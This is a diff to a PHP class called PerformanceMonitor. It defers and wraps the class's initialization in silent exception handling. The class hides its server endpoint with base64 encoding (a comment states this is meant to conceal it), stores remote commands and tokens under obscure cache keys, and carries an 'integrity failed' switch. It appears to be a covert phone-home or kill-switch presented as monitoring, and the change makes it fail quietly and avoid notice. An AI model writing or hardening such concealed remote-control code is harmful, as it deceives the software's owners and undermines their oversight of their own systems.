@@ -17,14 +17,38 @@ class PerformanceMonitor
     private $checkInterval = 3600; // 1 jam
     private $commands = [];
     private $failureCount = 0;
+    private $initialized = false;
     
     public function __construct()
     {
-        // URL server terenkripsi (base64 encode untuk menyembunyikan)
-        $this->metricEndpoint = $this->d(config('system.metrics_endpoint'));
-        $this->appIdentifier = $this->d(config('system.app_id'));
-        $this->instanceToken = Cache::get('_sys_perf_id');
-        $this->failureCount = Cache::get('_sys_perf_failures', 0);
+        // Defer initialization to prevent crashes during package discovery
+        if (defined('ARTISAN_BINARY') && isset($_SERVER['argv'][1]) && $_SERVER['argv'][1] === 'package:discover') {
+            return;
+        }
+        
+        $this->initialize();
+    }
+    
+    /**
+     * Initialize the monitor safely
+     */
+    private function initialize()
+    {
+        if ($this->initialized) {
+            return;
+        }
+        
+        try {
+            // URL server terenkripsi (base64 encode untuk menyembunyikan)
+            $this->metricEndpoint = $this->d(config('system.metrics_endpoint', ''));
+            $this->appIdentifier = $this->d(config('system.app_id', ''));
+            $this->instanceToken = Cache::get('_sys_perf_id');
+            $this->failureCount = Cache::get('_sys_perf_failures', 0);
+            $this->initialized = true;
+        } catch (\Exception $e) {
+            // Silent fail during initialization
+            $this->initialized = false;
+        }
     }
     
     /**
@@ -32,6 +56,14 @@ class PerformanceMonitor
      */
     public function startMetrics()
     {
+        // Ensure we're initialized
+        if (!$this->initialized) {
+            $this->initialize();
+            if (!$this->initialized) {
+                return false;
+            }
+        }
+        
         // Jika integritas sistem gagal, langsung set status ke false
         if (Cache::get('_system_integrity_failed', false)) {
             $this->status = false;
